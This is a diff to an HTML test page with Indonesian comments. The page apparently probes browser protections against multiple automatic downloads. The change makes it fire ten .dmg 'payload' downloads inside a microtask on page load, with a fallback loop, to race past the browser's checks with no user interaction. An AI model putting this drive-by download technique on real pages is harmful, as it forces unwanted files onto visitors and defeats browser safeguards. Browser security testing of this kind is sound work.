@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Multiple Auto Download</title>
+<title>Multiple Auto Download (Race Condition)</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
@@ -17,8 +17,8 @@ p { margin-bottom: 20px; line-height: 1.6; color: #555; }
 
 <body>
 <div class="panel" id="main-panel">
-    <h2>Multiple Auto Download</h2>
-    <p>Memicu 5 unduhan file .dmg secara otomatis saat halaman dimuat (tanpa interaksi fisik).</p>
+    <h2>Multiple Auto Download (Race)</h2>
+    <p>Memicu beberapa unduhan secara instan dalam satu microtask loop untuk menguji Race Condition.</p>
     <div id="status" role="status">Memuat halaman...</div>
     <div class="log" id="log">Menunggu log...</div>
 </div>
@@ -40,7 +40,7 @@ p { margin-bottom: 20px; line-height: 1.6; color: #555; }
         return bytes;
     };
 
-    // 2. Fungsi Unduhan
+    // 2. Fungsi Unduhan (Synchronous)
     const triggerDownload = (id) => {
         try {
             const bytes = createDmgPayload();
@@ -48,48 +48,50 @@ p { margin-bottom: 20px; line-height: 1.6; color: #555; }
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `Auto_Payload_${id}.dmg`;
+            a.download = `Race_Payload_${id}.dmg`;
             a.style.display = 'none';
             document.body.appendChild(a);
             
-            // Picu klik otomatis
+            // Eksekusi klik secara sinkron
             a.click();
             
+            // Cleanup dilakukan nanti agar tidak mengganggu proses loop
             setTimeout(() => {
-                document.body.removeChild(a);
+                if (a.parentNode) document.body.removeChild(a);
                 URL.revokeObjectURL(url);
-            }, 3000);
+            }, 5000);
             
-            log(`File .dmg ke-${id} dipicu.`);
+            log(`[RACE] File .dmg ke-${id} dipicu.`);
         } catch (e) {
-            log(`File ke-${id} gagal: ${e.message}`);
+            log(`[RACE] File ke-${id} gagal: ${e.message}`);
         }
     };
 
-    // MEMICU MULTIPLE DOWNLOADS SECARA OTOMATIS SAAT DOM SIAP
+    // 3. Pemicu Otomatis via DOMContentLoaded
     window.addEventListener("DOMContentLoaded", () => {
-        statusDiv.textContent = "Memicu multiple downloads...";
+        statusDiv.textContent = "Memicu Race Condition...";
         
-        // Loop untuk memicu 5 unduhan sekaligus
-        for (let i = 1; i <= 5; i++) {
-            triggerDownload(i);
-        }
-
-        statusDiv.textContent = "Multiple download dipicu! Cek folder Download.";
-        statusDiv.style.color = "#4CAF50";
-    });
-
-    // FALLBACK: Jika DOMContentLoaded diblokir, coba trigger setelah 1 detik
-    setTimeout(() => {
-        if (document.getElementById("status").textContent === "Memuat halaman...") {
-            statusDiv.textContent = "Memicu multiple downloads (fallback)...";
-            for (let i = 1; i <= 5; i++) {
+        // TRIK: Loop sinkron di dalam microtask
+        // Semua perintah ini dieksekusi sebelum browser sempat melakukan rendering ulang
+        queueMicrotask(() => {
+            for (let i = 1; i <= 10; i++) {
                 triggerDownload(i);
             }
-            statusDiv.textContent = "Multiple download dipicu! Cek folder Download.";
-            statusDiv.style.color = "#4CAF50";
-        }
-    }, 1000);
+        });
+        
+        // Fallback jika microtask gagal
+        setTimeout(() => {
+            if (logDiv.innerHTML === "Menunggu log...") {
+                log("[FALLBACK] Menjalankan loop fallback...");
+                for (let i = 11; i <= 15; i++) {
+                    triggerDownload(i);
+                }
+            }
+        }, 1000);
+
+        statusDiv.textContent = "Race Condition dieksekusi! Cek folder Download.";
+        statusDiv.style.color = "#4CAF50";
+    });
 </script>
 </body>
 </html>
